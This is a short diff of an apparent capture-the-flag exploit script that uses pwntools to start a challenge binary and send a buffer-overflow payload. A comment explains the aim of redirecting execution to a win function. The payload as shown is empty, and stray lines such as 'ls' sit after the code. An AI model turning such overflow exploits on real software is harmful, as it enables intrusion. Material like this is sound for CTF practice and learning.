@@ -1,6 +1,6 @@
 from pwn import *
 
-p = process (“./chall_02”)
+p = process ("./chall_02")
 p.recv()
 payload = b''
 #now we want to go to our base pointer - our location + the p(64) of where wwe want to jump
@@ -12,5 +12,3 @@ p.sendline(payload)
 p.interactive()
 ls
 
-
-sym.win
